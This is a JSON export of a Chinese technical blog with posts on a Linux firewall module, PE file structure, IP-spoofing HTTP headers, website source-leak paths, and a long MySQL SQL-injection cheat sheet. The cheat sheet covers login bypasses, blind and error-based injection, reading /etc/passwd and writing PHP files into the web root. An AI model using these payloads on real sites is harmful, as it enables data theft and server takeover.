{"pages":[],"posts":[{"title":"A Simple Packet Filtering Firewall in Linux(Linux下的包过滤防火墙)","text":"该防火墙通过 Linux内核模块LKM的C语言来编写的防火墙使用 Python写用户态下的界面Python与C结合来实现对防火墙进行配置源码地址: https://github.com/CSHF-yhhhh/A-Simple-Packet-Filtering-Firewall-in-Linux 准备工作 查看是否安装 linux-headers1ls -l /usr/src/linux-headers-$(uname -r) 如果不存在该目录,则安装:123sudo apt updateapt search linux-headers-$(uname -r)sudo apt install linux-headers-$(uname -r) 了解内核模块https://en.wikipedia.org/wiki/Loadable_kernel_module 了解 Netfilterhttps://en.wikipedia.org/wiki/Netfilter 接下来讲的是部分实现防火墙的原理,如果对原理不感兴趣只想直接运行的话, 点这里跳到代码运行介绍 编写一个简单的防火墙防火墙拦截数据包在包过滤防火墙中,最重要的就是把数据包拦截下来,钩子函数就是完成这一功能的函数,接下来介绍一下钩子函数 钩子函数的介绍钩子函数需要我们自己编写, 拦截到数据包后, 在函数中进行处理, 并处理数据包(通过返回值) 钩子函数的参数介绍123456789101112typedef unsigned int nf_hookfn(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));/*hooknum:钩子被记录的点skb:指向包含数据包信息的结构体的指针in:输入网络接口out:输出网口最后一个形参:指向一个由netfilter本身调用的函数的指针，在所有钩子完成之后，钩子函数通常不会调用它，因为这会导致其他钩子不能完成它们的工作。*/ 数据包的接收点(拦截点) 接收点 描述 NF_IP_PRE_ROUTING 收到数据包后 NF_IP_LOCAL_IN 发送到网络栈的数据包 NF_IP_FORWARD 要被转发的数据包 NF_IP_POST_ROUTING 已经经过路由准备发送的包 NF_IP_LOCAL_OUT 来自本机网络栈的数据包 钩子函数处理包的方法钩子函数通过 return 以下值中的一个来处理包 值 描述 NF_DROP 丢弃数据包 NF_ACCEPT 接受数据包 NF_STOLEN 钩子窃取数据包 NF_QUEUE 将数据包排队到用户空间 NF_REPEAT 重复钩子函数 注册钩子函数12345678910111213141516171819202122232425262728293031323334//nf_hook_ops结构体struct nf_hook_ops { struct list_head list; /* User fills in from here down. */ nf_hookfn *hook; struct module *owner; u_int8_t pf; unsigned int hooknum; /* Hooks are ordered in ascending priority. */ int priority;};/*hook: 处理包的钩子函数owner: 表示该函数在其中定义和注册的模块。pf: 指定想要接收声明类型的数据包hooknum: 钩子被记录的点priority: 优先级 priority 可选字段 NF_IP_PRI_FIRST = INT_MIN NF_IP_PRI_CONNTRACK_DEFRAG = -400 NF_IP_PRI_RAW = -300 NF_IP_PRI_SELINUX_FIRST = -225 NF_IP_PRI_CONNTRACK = -200 NF_IP_PRI_MANGLE = -150 NF_IP_PRI_NAT_DST = -100 NF_IP_PRI_FILTER = 0 NF_IP_PRI_SECURITY = 50 NF_IP_PRI_NAT_SRC = 100 NF_IP_PRI_SELINUX_LAST = 225 NF_IP_PRI_CONNTRACK_CONFIRM = INT_MAX NF_IP_PRI_LAST = INT_MAX*/ 注册完钩子函数后, 即可使用, 更多细节可以阅读 firewall.c 中源码的注释 部署防火墙以下提到的命令都最好都在代码所在目录用root下执行 测试时所用的环境Ubuntu 18.04 gcc version 7.5.0 python 3.6.9 测试防火墙切换到代码所在目录下 防火墙的启动1. 生成内核模块1make make 可能会有一些warning,这些没太大问题,如果有强迫症的话可以自己去改一下 2. 加载内核模块1insmod firewall.ko 执行这条命令后, 如果没有任何提示,则防火墙可能加载成功 3. 信息查看查看所有已加载的模块,如果能找到firewall及表示加载成功 1lsmod 查看防火墙模块信息 1modinfo firewall.ko 持续监听内核日志, 该命令使用 Ctrl + C 结束 1journalctl -f 防火墙的操作 PS: 其实在make之后, 就可以通过该界面来配置防火墙,包括防火墙的启动与停止,前提是要以root的身份来执行所以使用该模块的前提就是make成功 启动防火墙的配置界面1python3 page.py 启动后界面如下:通过界面操作, 即可配置防火墙的过滤规则 怎么使用就自己取摸索吧, 如果有Bug可以给我留言,有空我就会取修改 (¬‿¬)","link":"/2021/05/27/A-Simple-Packet-Filtering-Firewall-in-Linux/"},{"title":"HTTP更改客户端IP的方式","text":"HTTP头 描述 对应PHP字段 X-Forwarded-For 用户是在哪个IP使用的代理（有可能存在，也可以伪造） $_SERVER[‘HTTP_X_FORWARDED_FOR’] X-Remote-Addr 访问端（有可能是用户，有可能是代理的）IP $_SERVER[‘REMOTE_ADDR’] X-Client-IP 用户是在哪个IP使用的代理（有可能存在，也可以伪造） $_SERVER[‘HTTP_CLIENT_IP’]","link":"/2021/02/03/ChangeHttpClientIP/"},{"title":"基于 Kivy&#x2F;Kivymd 开发的成语学习APP","text":"本项目已成功打包,使用的打包环境请参考nkiiiid的文章buildozer.spec文件请参考/MainApp/buildozer.spec项目和成功成功打包的APK已上传至github ,可自行下载 环境说明 Kivy==1.11.1kivy-deps.glew==0.3.0kivy-deps.gstreamer==0.3.1kivy-deps.sdl2==0.3.1Kivy-Garden==0.1.4kivymd==0.104.1Django==3.1openpyxl==3.0.6 本地运行 server服务端 服务端使用Diango框架,通过json来传输数据 12#如果需要部署在服务器上记得在服务器中开放使用的端口python ./server/manage.py runserver ip:port #eg: python manage.py 0.0.0.0:12345 MainApp/client/client.py 在这个文件夹中设置服务器的地址和端口 启动app 在MainApp下,通过以下命令运行 1python main.py","link":"/2021/04/23/Kivy-Kivymd-Learn-APP/"},{"title":"网站信息泄露","text":"常见的网站源码泄露 备份常见备份文件名 1234567webwebsitebackupbackwwwwwwroottemp 备份文件的后缀 1234tartar.gzziprar 使用文件名与后缀的组合来测试是否有备份文件 版本控制访问 12/.git/.svn VIM当我们在使用vim编辑的时候，vim会在被编辑文件同一目录下，创建一个名为filename.swp的文件，记录我们的动作，比如在编辑index.php的时候会存在一个index.php.swp的文件,可以访问改文件来查看源码有时也可能不需要加. 123.index.php.swp #第一次产生的交换文件.index.php.swo #第二次产生的交换文件.index.php.swn #第三次产生的交换文件 其他12/editor/tz.php","link":"/2021/02/03/WebsiteInformationLeakage/"},{"title":"PE文件","text":"PE文件的简单介绍 前言PE 的全称是 Portable Executable，意为可移植的可执行的文件，常见的 EXE、DLL、OCX、SYS、COM 都是 PE 文件，PE 文件是微软 Windows 操作系统上的程序文件（可能是间接被执行，如 DLL）。PE 是一种数据结构，其中封装了 Windows OS 加载程序管理包装的可执行代码所需的信息。 RVA(relative virtual address)相对虚拟内存地址（Reverse Virtual Address , RVA）是相对于基地址的偏移，即 RVA 是虚拟内存中用来定位某个特定位置的地址，该地址的值是这个特定位置距离某个模块基地址的偏移量，所以说 RVA 是针对某个模块而存在的。 PE 文件的基本结构 这些部分是 PE 文件中真正用于 Win32 的部分，为了与 DOS 系统的文件格式兼容，在这部分的前面又加上了一个标准的 DOS MZ 格式的可执行部分，所有这些部分合起来组成了现在使用的 PE 文件。 1. DOS 文件头和 DOS 块（图中的 ①） PE 文件中包括一个标准的 DOS 可执行文件部分，该部分是用来向下兼容，如果在 DOS 下执行一个 PE 文件，系统可以将文件解释为 DOS 下的.exe 可执行格式，并执行 DOS 部分的代码。 PE 文件中的 DOS 部分由 MZ 格式的文件头和可执行代码部分组成，可执行代码被称为“DOS 块”（DOS stub）。 如果 e_magic 字段为 5A4DH 表示 DOS MZ header 有效。且 e_lfarlc 字段表示的是PE header的地址。 2. PE 文件头（也称 NT 文件头）（图中的 ②） PE 文件头是由 IMAGE_NT_HEADERS 结构定义的 如图 PE 文件头的第一个双字 Signature 是一个标志，它被定义为00004550h，也就是字符“P”，“E”加上两个 0。这也是“PE”这个称呼的由来，大部分的文件属性由标志后面的IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER32结构来定义。虽然这两个 PE 文件表头结构是可选的，但实际上这个名称是名不符实的，因为它总是存在于每个 PE 文件中。 IMAGE_FILE_HEADER 结构 标准IMAGE_FILE_HEADER紧跟在PE头标识后，即位于IMAGE_DOS_HEADER的e_lfanew值+4 的位置。由此位置开始的20个字节为数据结构标准 PE 头IMAGE_FILE_HEADER的内容。 Machine字段：来指定文件的运行平台 [点此查看预定义值] NumberOfSections字段：指出文件中存在的节的数量 TimeDateStamp字段：编译器创建此文件的时间，它的数值是从 1969 年 12 月 31 日下午 4：00 开始到创建时间为止的总秒数。 PointerToSymbolTable和NumberOfSymbols字段：这两个字段并不重要，它们与调试用的符号表有关。 SizeOfOptionalHeader字段：紧接在当前结构下面的IMAGE_OPTIONAL_HEADER32结构的长度，这个值等于00e0h。 Characteristics字段：属性标志字段，它的不同数据位定义了不同的文件属性 [点此查看预定义值] IMAGE_OPTIONAL_HEADER32 结构 AddressOfEntryPoit 字段指出文件被执行时的入口地址（这是一个 RVA 地址）。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码就可以了。 ImageBase 字段指出文件的优先装入地址。也就是说当文件被执行时，如果可能的话，Windows 优先将文件装入到由ImageBase字段指定的地址中，只有指定的地址已经被其他模块使用时，文件才被装入到其他地址中。 SectionAlignment 字段和 FileAlignment 字段SectionAlignment字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。而 FileAlignment 字段指定了节存储在磁盘文件中时的对齐单位。 Subsystem 字段指定使用界面的子系统。这个字段决定了系统如何为程序建立初始的界面。 DataDirectory 字段这个字段可以说是最重要的字段之一，它由 16 个相同的IMAGE_DATA_DIRECTORY结构组成，虽然 PE 文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这 16 个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。 如果将这 16 个 IMAGE_DATA_DIRECTORY 结构按照排列顺序编号为索引号 0 到 15，那么其用途和索引号是一一对应的，其对应关系如下表 索引 索引值在 Windows.inc 中的预定义值 对应的数据块 0 IMAGE_DIRECTORY_ENTRY_EXPORT 导出表地址和大小 1 IMAGE_DIRECTORY_ENTRY_IMPORT 导入表地址和大小 2 IMAGE_DIRECTORY_ENTRY_RESOURCE 资源表地址和大小 3 IMAGE_DIRECTORY_ENTRY_EXCEPTION 异常表地址和大小 4 IMAGE_DIRECTORY_ENTRY_SECURITY 属性证书数据地址和大小 5 IMAGE_DIRECTORY_ENTRY_BASERELOC 基地址重定位表地址和大小 6 IMAGE_DIRECTORY_ENTRY_DEBUG 调试信息地址和大小 7 IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 版权信息 8 IMAGE_DIRECTORY_ENTRY_GLOBALPTR 指向全局指针寄存器的值 9 IMAGE_DIRECTORY_ENTRY_TLS 线程局部存储地址和大小 10 IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 加载配置表地址和大小 11 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 绑定导入表地址和大小 12 IMAGE_DIRECTORY_ENTRY_IAT 导入函数地址表 13 IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 延迟导入表地址和大小 14 IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR CLR 运行时头部数据地址和大小 15 未使用 例: 在 PE 文件中寻找特定的数据时就是从这些 IMAGE_DATA_DIRECTORY 结构开始的，比如要存取资源，那么必须从第 3 个 IMAGE_DATA_DIRECTORY 结构（索引为 2）中得到资源数据块的大小和位置；同理，如果要查看 PE 文件导入了哪些 DLL 文件的哪些 API 函数，那就必须首先从第 2 个 IMAGE_DATA_DIRECTORY 结构得到导入表的位置和大小。 3. 节表 节表头紧跟在IMAGE_NT_HEADERS后面 PE 文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。 节表被存放在紧接在 PE 文件头的地方，也就是从 PE 文件头 （注意：不是文件本身的头部） 开始的偏移为00f8h的地方。 PE 文件中的数据按照装入内存后的页面属性被划分成多个节，并由节表中的数据来描述这些节。一个节中的数据仅仅是属性相同而已，并不一定就是同一种用途的，比如导入表、导出表等就有可能和只读常量一起被放在同一个节中，因为它们的属性同是可读不可写的。其次，由于不同用途的数据可能被放在同一个节中，仅仅依靠节表是无法确定它们的存放位置的，PE 文件中依靠文件头中IMAGE_OPTIONAL_HEADER32结构内的数据目录表来指出它们的位置，可以由数据目录表来定位的数据包括导入表、导出表、资源、重定位表和 TLS 等 15 种数据。 节表中IMAGE_SECTION_HEADER结构的总数由 PE 文件头IMAGE_NT_HEADERS结构中的FileHeader.NumberOfSections字段指定。 IMAGE_SECTION_HEADER 结构的定义如下： 结构中的有些字段是供 COFF 格式的 obj 文件使用的，对可执行文件来说不代表任何意义，在分析的时候可以不予理会，真正有用的几个字段说明如下。 字段名 作用 备注 Name1 表示节的名称 每个节的名称是唯一的，不能有同名的两个节(，在 MASM32 产生的可执行文件中，代码节被命名为“.text”；可读写的数据节被命名为“.data”；包含只读数据、导入表以及导出表的节被命名为“.rdata”；而资源节被命名为“.rsrc”等。但是在其他一些编译器中，导入表被单独放在“.idata”中；而代码节可能被命名为“.code”。) VirtualSize 代表节的大小 这是节的数据在没有进行对齐处理前的实际大小 PointerToRawData 指出节在磁盘文件中的所处的位置 这个数值是从文件头开始算起的偏移量 SizeOfRawData 指出节在磁盘文件中所占的空间大小 ，这个数值等于 VirtualSize 字段的值按照 FileAlignment 的值对齐以后的大小 Characteristics 这是节的属性标志字段，其中的不同数据位代表了不同的属性 通过 Name1 、VirtualSize、PointerToRawData、SizeOfRawData ，装载器就可以从 PE 文件中找出某个节（从 PointerToRawData 偏移开始的 SizeOfRawData 字节）的数据，并将它映射到内存中去（映射到从模块基地址开始偏移 VirtualAddress 的地方，并占用以 VirtualSize 的值按照页的尺寸对齐后的空间大小）。 导入表 定义在 Win32 编程中常常用到“导入函数”（Import functions），导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个 DLL 中，在调用者程序中只保留一些函数信息，包括函数名及其驻留的 DLL 名等，导入表中保存的正是函数名和其驻留的 DLL 名等动态链接所必需的信息。 导入表的位置导入表的位置和大小可以从 PE 文件头中IMAGE_OPTIONAL_HEADER32结构的数据目录字段中获取，对应的项目是 DataDirectory 字段的第 2 个IMAGE_DATA_DIRECTORY结构(也就是IMAGE_DIRECTORY_ENTRY_IMPORT) 导入表的结构 结构中的Name1字段指向此结构所对应的 DLL 文件 的名称，这个文件名是一个以NULL结尾的字符串。 OriginalFirstThunk字段和FirstThunk字段都指向一个包含一系列IMAGE_THUNK_DATA结构的数组，数组中的每个IMAGE_THUNK_DATA结构定义了一个导入函数的信息，数组的最后以一个内容为 0 的IMAGE_THUNK_DATA结构作为结束。 IMAGE_THUNK_DATA结构如下一个IMAGE_THUNK_DATA结构实际上就是一个双字，之所以把它定义成结构，是因为它在不同的时刻有不同的含义 最高位为 1 时，表示函数是以序号的方式导入的，这时双字的低位就是函数的序号。 当双字的最高位为 0 时，表示函数以字符串类型的函数名方式导入(这时双字的值是一个 RVA，指向一个用来定义导入函数名称的IMAGE_IMPORT_BY_NAME结构) OriginalFirstThunk指向的IMAGE_THUNK_DATA数组包含导入信息，在这个数组中只有Ordinal和AddressOfData是有用的，因此可以通过OriginalFirstThunk查找到函数的地址。 FirstThunk则略有不同，在 PE 文件加载以前或者说在导入表未处理以前，他所指向的数组与OriginalFirstThunk中的数组虽不是同一个，但是内容却是相同的，都包含了导入信息，而在加载之后，FirstThunk中的Function开始生效，他指向实际的函数地址，因为FirstThunk实际上指向IAT中的一个位置，IAT就充当了IMAGE_THUNK_DATA数组，加载完成后，这些 IAT 项就变成了实际的函数地址，即 Function 的意义。看图可能更方便与理解 导入地址表 IAT IMAGE_IMPORT_DESCRIPTOR结构中FirstThunk字段指向的数组最后会被替换成导入函数的真正入口地址，暂且把这个数组称为导入地址数组。在 PE 文件中，所有 DLL 对应的导入地址数组在位置上是被排列在一起的，全部这些数组的组合也被称为导入地址表（Import Address Table，或者简称为 IAT），导入表中第一个IMAGE_IMPORT_DESCRIPTOR结构的FirstThunk字段指向的就是 IAT 的起始地址。 还有一个方法可以更方便地找到 IAT 的地址，那就是通过数据目录表。数据目录表中的第 13 项（索引值为 12/IMAGE_DIRECTORY_ENTRY_IAT）直接用来定义 IAT 数据块的位置和大小。 扩展知识 装载 PE 文件的主要步骤 当 PE 文件被执行，PE 装载器检查 DOS MZ Header 里的 PE Header 偏移量，如果找到就跳转到 PE Heardr。 PE 装载器检查 PE Header 的有效性，如果有效就跳转到 PE Header 的尾部 下面紧跟 PE Heardr 的是节表。PE 装载器读取其中的节信息，并采用文件映射方法将这些节映射到内存，同时附上节表里指定的节属性。 PE 文件映射入内存后，PE 装载器将处理 PE 文件中类似 Import Tabel(引入表)逻辑部分。 检验 PE 文件的有效性 首先检验文件头部第一个字e_magic的值是否等于 5A4DH , 如果是，则检查第二项。 一旦证明文件的 DOS header 有效后，就用e_lfanew来定位 PE header 。比较 PE header 的 Signature 是否为 00004550h；是则可以认为该文件是一个有效的 PE 文件。 例: 查看 PE 文件 本次使用的是Detect it Easy，该软件为开源软件，有兴趣的可以去阅读源代码。 软件界面如下 选中程序后,点击 PE 按钮即可查看完整 PE 信息, 如图: 查看 PE 文件的导入表上面在IMAGE_OPTIONAL_HEADER32)中说过, IMAGE_OPTIONAL_HEADER32 中的 DataDirectory 里面的第二个 IMAGE_DATA_DIRECTORY 即为导入表。如图：在这里可以看到导入表的 16 进制信息,当然,这个软件将导入表的信息处理好放在 Import 下,让我们更好查看:在这个模块中,也将导入函数的相关信息等,还是比较方便的。 参考 《Windows 环境下 32 位汇编语言程序设计(典藏版)》 罗云彬[著] 《Windows PE 权威指南》戚利[著] 微软官方文档 PE 文件查看器Detect it Easy(点击转到下载地址)","link":"/2021/05/04/PE_FILE/"},{"title":"SQL注入总结(MySQL)","text":"总结MySql注入的方法及绕过 常用信息 数据库信息的获取 注入方法 常见绕过 附录 常用信息 测试 payload(万能密码) 注释符号 常用运算符 常用函数和语句 字符串拼接 测试 payload(万能密码)其中单引号都可用换成双引号 123456789admin' --admin' #admin'\\/*1' or 1=1#1' or 1=1--1' or 1=1/*') or '1'='1') or ('1'='1'1 or '1 注释符号12345-- x#注意--后有一个空格, x为任意字符#/**/ # 多行注释,可以用来绕过空格过滤/*! */ # MYSQL特有;%00 常用运算符 运算符 说明 || 或,同or &amp;&amp; 与,同and ! 非,同not ^ 异或,同xor &amp; 按位与 | 按位或 &lt;&lt; 按位左移 &gt;&gt; 按位右移 ~ 按位取反 + 加, 可代替空格 - 减 * 乘 / 除 % 取余,同MOD = 等于 &lt;&gt; != 不等于 &lt; 小于 &gt; 大于 &lt;= 小于等于 &gt;= 大于等于 BETWEEN 在两值之间 NOT BETWEEN 不在两值之间 IN 在集合中 NOT IN 不在集合中 &lt;=&gt; 两个操作码均为 NULL 时, 其所得值为 1；而当一个操作码为 NULL 时, 其所得值为 0 LIKE 模糊匹配 REGEXP RLIKE 正则式匹配 IS NULL 为空 IS NOT NULL 不为空 常用函数和语句 函数 作用 user() 当前用户名 database() 当前数据库名 current_user() 当前用户,可用来查看权限 version() 数据库版本 @@datadir 数据库的路径 load_file() 读文件操作 into outfile()/into dumpfile 写文件操作 LENGTH(str) 返回字符串的长度. PI() 返回 π 的具体数值. REGEXP “statement” 正则匹配数据, 返回值为布尔值. LIKE “statement” 匹配数据, %代表任意内容. 返回值为布尔值. RLIKE “statement” 与 regexp 相同. LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置. POSITION(substr IN str) 等同于 LOCATE(). LOWER(str) 将字符串的大写字母全部转成小写. 同：LCASE(str). UPPER(str) 将字符串的小写字母全部转成大写. 同：UCASE(str). ELT(N,str1,str2,str3,…) 与 MAKE_SET(bit,str1,str2…)类似, 根据 N 返回参数值. NULLIF(expr1,expr2) 若 expr1 与 expr2 相同, 则返回 expr1, 否则返回 NULL. CHARSET(str) 返回字符串使用的字符集. DECODE(crypt_str,pass_str) 使用 pass_str 作为密码, 解密加密字符串 crypt_str. 加密函数：ENCODE(str,pass_str). 字符串拼接 函数 作用 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为 SUBSTRING 的简单版。 SUBSTRING() 多种格式 SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。 RIGHT(str,len) 对指定字符串从最右边截取指定长度。 LEFT(str,len) 对指定字符串从最左边截取指定长度。 RPAD(str,len,padstr) 在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。 LPAD(str,len,padstr) 与 RPAD 相似，在 str 左边补齐。 MID(str,pos,len) 同于 SUBSTRING(str,pos,len)。 INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。 CONCAT(str1,str2…) 函数用于将多个字符串合并为一个字符串 GROUP_CONCAT(…) 返回一个字符串结果，该结果由分组中的值连接组合而成。 MAKE_SET(bits,str1,str2,…) 根据参数 1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,’1’,’710’))。 数据库信息的获取 数据库名 表名 列名 表中的数据 查询连接过数据库的所有 IP 和其连接过的总次数 注入方法 数据库名1234567891011#查看当前数据库SELECT database();#查看所有数据库show databases;SELECT schema_name FROM information_schema.schemata;SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#通过不存在的函数名.可能可以得到数据库名SELECT a(); 表名1234567#查看指定数据库的表名SELECT grouop_concat(table_name) FROM information_schema.tables WHERE table_schema=database() SELECT GROUP_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database() # 查询被访问过的表SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name; SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name; 列名12345678910111213141516171819#通过预定义的分析诊断工具, 在执行完语句后加上即可procedure analyse() #如:SELECT * FROM `users` procedure analyse()# 查询指定表的列名SELECT GROUP_concat(column_name) FROM information_schema.columns WHERE table_name = 表名;# 通过比较数据大小,获得表中的数据SELECT ((SELECT 1,'Dumb',&quot;Dum&quot;)&gt;(SELECT * FROM users LIMIT 1))#通过join后出现相同列名,报错查看其他列名SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b)c /*注: 执行完上面语句后,会提示 Duplicate column name 'id' 这就是第一列的列名 得到第一列列名后,通过 using 声明内连接来避免报错, 执行下面语句后,得出第二列列名,以此类推 SELECT * FROM `users` union SELECT * FROM (SELECT * FROM users as a join users b using(id))c */#猜列名and 列名 is not nulland substr(列名,1,1)='a 表中的数据12#查询表中的指定列数据(其中的`1`即为第几列)SELECT GROUP_concat(`1`) FROM (SELECT 1,2,3 union SELECT * FROM users)x; 查询连接过数据库的所有 IP 和其连接过的总次数1SELECT host,total_connections FROM sys.host_summary; 查看 SQL 语句执行的记录1SELECT * FROM sys.x$statement_analysis; 注入方法 union 联合注入 堆叠注入 盲注 布尔盲注 时间盲注 报错注入 二次注入 limit 注入 update 注入 insert 注入 ORDER BY 注入 GROUP BY 注入 读写文件 无列名盲注 union 联合注入基本步骤:[1]猜语句结构并闭合--&gt;[2]猜查询字段数--&gt;[3]拼接查询语句 猜查询字段数方法 123456789#若实际查询列数大于, 则页面错误/无内容, 若小于或等于, 则页面正常GROUP BY 第几列ORDER BY 第几列#使用union, union SELECT几列成功,就有几列数据union SELECT 1,2,3,4,x...#使用limit 获得查询列数,有几列就几个@, 如果不一致则报错SELECT * FROM users ORDER BY id desc limit 0,1 into @,@,@ 堆叠注入可以用 ; 来结束语句,并执行其他语句 1234567891011#查看数据库相关信息;show databases;;show tables;;show columns FROM 表名;#更新数据;update users set password=&quot;123456&quot; WHERE 1;#预处理语句;PREPARE hack FROM &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;EXECUTE hack;#;SET @hacksql = &quot;要执行的sql语句的字符串(可以为16进制、char组成的字符串等)&quot;;PREPARE hack FROM @hacksql;EXECUTE hack;# 盲注 布尔盲注对真或假条件返回的内容容易区分时使用 常用 payload 12345#让前面的语句为假,判断后面的语句SELECT * FROM users WHERE username = '1' and if(ascii(substr(database(),1,1))&lt;128,1,0);#SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128; ## 如果注释符被过滤, 可以类似与这样改SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and '1'='1 时间盲注对真或假条件返回的内容难区分时使用 常用 payload(可以发现只是在 bool 盲注的基础上,使语句成功时等待一段时间) 12345#让前面的语句为假,判断后面的语句SELECT * FROM users WHERE username = '1' and if(ascii(substr(database(),1,1))&lt;128,sleep(3),0);#SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and sleep(3) ## 如果注释符被过滤, 可以类似与这样改SELECT * FROM users WHERE username = '1' and ascii(substr(database(),1,1))&lt;128 and sleep(3)and '1'='1 报错注入在执行错误语句时,会输出报错信息 exp 报错exp 参数很大时,会产生报错信息1exp(~(SELECT * FROM(SELECT user())a)); pow 报错原理同 exp1pow(~(SELECT * FROM(SELECT user())a),9999); updatexml 报错updatexml 是由于参数的格式不正确而产生的错误12SELECT name FROM user WHERE id=1 and updatexml(1,concat('~',(要查询的内容),'~'),3);#SELECT name FROM user WHERE id=1 and updatexml(1,concat(0x7e,(要查询的内容),0x7e),3);# extractvalue 报错原理同 updatexml1SELECT username FROM user WHERE id=1 and extractvalue(1,concat(0x7e,(要查询的内容),0x7e))# rand()+GROUP()+count()原理: 由于由于WHERE条件每执行一次, rand函数就会执行一次, 在统计数据时判断依据不能动态改变, 所以ORDER/GROUP BY后不能接rand()floor(rand(0)*2)是为了随机获得 0 和 112(SELECT count(*) FROM information_schema.tables GROUP BY concat((SELECT user()),0x7e,floor(rand(0)*2)));union SELECT count(*),concat((SELECT GROUP_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'~',floor(rand(0)*2))as a FROM information_schema.tables GROUP BY a # 二次注入将恶意数据存储到数据库后, 被读到 SQL 语句中导致的注入,如:将username = 'admin' #'存储到数据库中, 由于 php 中使用 addslashes 会给单引号转义成为 admin\\' #, 但是存入数据库时, 数据库会把 \\' 看成转义字符 变成'来存储,所以最终存入数据库的值为 admin' #, 执行时就变成了 1SELECT * FROM users WHERE username = 'adimn' #' limit 注入使用 procedure analyse 注入,analyse 可以有两个参数: max_elements:指定每列非重复值的最大值, 当超过这个值的时候, MySQL 不会推荐 enum 类型. （默认值 256） max_memory （默认值 8192）analyse()为每列找出所有非重复值所采用的最大内存大小. 12345678#得到列的相关信息SELECT * FROM users ORDER BY id desc limit 0,1 procedure analyse(1,1)#与报错注入结合,得到其他信息SELECT id FROM users limit 2 procedure analyse(extractvalue(1,concat(0x3a,version())),1);#写文件SELECT * FROM users ORDER BY id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16进制字符串#获得查询列数,有几列就几个@, 如果不一致则报错SELECT * FROM users ORDER BY id desc limit 0,1 into @,@,@ update 注入update 注入一般使用盲注 1234#其中条件可以是任意表达式,如果条件为真,则会等待5秒, 但是修改后的字段值还是 123update users set password='123'|if(条件,sellp(5), 1) WHERE id = 14;#如果表达式为真则会将字段名修改为 1update users set password = '0' | (substr(database(),1,1) = 's') WHERE id=14; insert 注入原理同 update 注入 1234#其中条件可以是任意表达式,如果条件为真,则会等待5秒, 但是修改后的字段值还是 123insert users value (14, &quot;CSHF&quot;, &quot;0&quot;|if(条件,sellp(5), 1));#如果表达式为真则会将字段名修改为 1insert users value (14, &quot;CSHF&quot;, &quot;0&quot;|(substr(database(),1,1) = 's'); ORDER BY 注入使用报错注入 1SELECT * FROM users ORDER BY updatexml(1,concat('~',(要查询的内容),'~'),3);# GROUP BY 注入也相当于是 bool 盲注 1SELECT * FROM users GROUP BY 1 having substr((SELECT database()),1,1)&lt;'z' 读写文件 读文件 1234SELECT LOAD_FILE('/etc/passwd')SELECT LOAD_FILE(0x2f6574632f706173737764)load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取服务端文件load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\\n'; #读取客户端文件 写文件 123SELECT '&lt;?php phpinfo();?&gt;' into outfile '/var/www/html/1.php'SELECT version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e # 这里写16进制的字符串 无列名盲注子查询可以使用 &gt;, =, &lt; 来进行比较一般结合bool盲注使用, 注: 对字母的大小写不敏感, 也就是说 'a' = 'A' 1(select 'admin','admin')&gt;(select * from users limit 1) 常见绕过 and 或 or 被过滤/拦截 结果中的关键字被过滤 空格被过滤/拦截 单双引号 逗号被过滤 等号或 like 被过滤 if 被过滤 union被过滤 数字被过滤 HANDLER 语句代替SELECT查询 and 或 or 被过滤/拦截 双写 aandnd、oorr &amp;&amp; 等于 and, || 等于 or 拼接等号=, 如: id=1=(表达式) 使用异或号 xor,^, 如 id=1^(表达式), id=(1)xor(表达式) 结果中的关键字被过滤 使用 replace(group_concat(username),'flag','galf') 空格被过滤/拦截 使用括号嵌套 用注释/**/, /*! */代替空格 使用 + 代替空格 使用不可见字符代替空格, 如 %09 %0a %0b %0c %0d %a0 等 and/or前的空格可省略, and/or后面可用跟上偶数个! 或~来代替空格 例: SELECT/**/*/*!*/FROM/**/users/**/WHERE+id =1/**/or!!~~1 单双引号 如果需要闭合单双引号, 尝试是否存在编码问题,通过编码来闭合 或者是否存在二次注入来闭合引号 如果不需要闭合引号, 